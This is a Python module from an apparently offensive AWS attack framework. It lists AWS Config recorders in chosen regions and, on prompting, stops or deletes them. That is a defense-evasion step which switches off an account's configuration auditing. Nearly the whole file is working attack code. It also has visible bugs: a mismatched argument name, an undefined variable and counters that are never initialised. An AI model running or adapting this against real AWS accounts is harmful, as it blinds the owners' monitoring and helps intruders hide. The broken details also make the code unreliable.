#!/usr/bin/env python3
import datetime

import argparse
from copy import deepcopy


def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    get_regions = awsattack_main.get_regions

    config_regions = get_regions('config')

    recorders = []

    summary_data = {}

    tmp_config_regions = set()
    if args.config_recorders is not None:
        for recorder in args.config_records.split(','):
            name, region = recorder.split('@')
            recorders.append({
                'name': name,
                'Region': region
            })
            tmp_config_regions.add(region)

    if len(tmp_config_regions) > 0:
        config_regions = tmp_config_regions
    else:
        config_data = deepcopy(session.Config)

        if 'Rules' not in config_data:
            if fetch_data(['Logging/Monitoring Data'], technique_info['prerequisite_modules'][0], ' '.join(arguments)) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                recorders = deepcopy(session.Config['Recorders'])
        else:
            recorders = config_data['Recorders']
        
    if len(recorders) > 0:
        print('Starting Config recorders...\n')
        for region in config_regions:
            print('  Starting region {}...\n'.format(region))

            client = awsattack_main.get_boto3_client('config', region)

            for recorder in recorders:
                if recorder['Region'] == region:
                    action = input('    Recorder Name: {}\n      Do you want to stop (stop), delete (del), or skip (skip) this recorder? (stop/del/skip) '.format(recorder['name'])).strip().lower()
                    if action == 'del':
                        try:
                            client.delete_configuration_recorder(
                                ConfigurationRecorderName=recorder['name']
                            )
                            print('        Successfully deleted recorder {}!\n'.format(recorder['name']))
                            summary_data['awsconfig']['recorders']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete recorder {}:\n          {}\n'.format(recorder['name'], error))
                    elif action == 'stop':
                        try:
                            client.stop_configuration_recorder(
                                ConfigurationRecorderName=recorder['name']
                            )
                            print('        Successfully stopped recorder {}!\n'.format(recorder['name']))
                            summary_data['awsconfig']['recorders']['stopped'] += 1
                        except Exception as error:
                            print('        Could not stop recorder {}:\n          {}\n'.format(recorder['name'], error))
                    else:
                        print('        Skipping recorder {}...\n'.format(recorder['name']))
        print('Config recorders finished.\n')
    else:
        print('No recorders found. Skipping Config recorders...\n')


    return summary_data
